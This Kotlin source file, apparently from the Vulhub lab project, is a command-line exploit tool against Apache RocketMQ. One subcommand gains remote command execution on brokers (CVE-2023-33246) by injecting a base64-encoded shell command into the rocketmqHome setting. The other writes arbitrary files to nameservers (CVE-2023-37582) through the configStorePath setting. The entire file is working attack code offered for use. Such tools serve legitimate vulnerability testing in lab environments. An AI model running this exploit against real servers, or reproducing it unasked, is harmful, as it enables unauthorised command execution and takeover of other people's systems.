package org.vulhub

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.core.subcommands
import com.github.ajalt.clikt.parameters.options.default
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.options.required
import com.github.ajalt.clikt.parameters.options.help
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt
import java.net.InetAddress
import java.util.Base64
import java.util.Properties
import java.util.ArrayList

class RocketMQAttack : CliktCommand(
    name = "rocketmq-attack",
    help = "A tool for executing commands on RocketMQ brokers and nameservers"
) {
    override fun run() = Unit
}

abstract class BaseAttackCommand(
    name: String,
    help: String
) : CliktCommand(name = name, help = help) {
    protected fun getCmd(cmd: String): String {
        val cmdBase = Base64.getEncoder().encodeToString(cmd.toByteArray())
        return "-c \$@|sh . echo echo \"$cmdBase\"|base64 -d|sh -i;"
    }
}

class AttackBroker : BaseAttackCommand(
    name = "AttackBroker",
    help = "Execute commands on RocketMQ broker (CVE-2023-33246)"
) {
    private val target by option("-t", "--target")
        .help("Target address (host:port)")
        .required()
    
    private val cmd by option("-c", "--cmd")
        .help("Command to execute")
        .required()

    override fun run() {
        echo("Executing command $cmd on broker $target")
        val admin = DefaultMQAdminExt()
        try {
            admin.start()
            val props = Properties().apply {
                setProperty("rocketmqHome", getCmd(cmd))
                setProperty("filterServerNums", "1")
            }
            
            admin.updateBrokerConfig(target, props)
            val brokerConfig = admin.getBrokerConfig(target)
            echo("Command executed successfully")
            echo("rocketmqHome: ${brokerConfig.getProperty("rocketmqHome")}")
            echo("filterServerNums: ${brokerConfig.getProperty("filterServerNums")}")
        } catch (e: Exception) {
            echo("Error: ${e.message}", err = true)
            System.exit(1)
        } finally {
            admin.shutdown()
        }
    }
}

class AttackNamesrv : BaseAttackCommand(
    name = "AttackNamesrv",
    help = "Write arbitrary file to RocketMQ nameserver (CVE-2023-37582)"
) {
    private val target by option("-t", "--target")
        .help("Target address (host:port)")
        .required()

    private val file by option("-f", "--file")
        .help("Target file path to write")
        .required()

    private val data by option("-d", "--data")
        .help("Content to write into the file")
        .required()

    override fun run() {
        echo("Attack name server $target")
        echo("Will write content to file: $file")
        val admin = DefaultMQAdminExt()
        try {
            admin.start()
            val props = Properties().apply {
                setProperty("configStorePath", file)
                setProperty("productEnvName", "center\\n$data")
            }

            admin.updateNameServerConfig(props, arrayOf(target).toList())
        } finally {
            admin.shutdown()
        }
    }
}

fun main(args: Array<String>) = RocketMQAttack()
    .subcommands(AttackBroker(), AttackNamesrv())
    .main(args)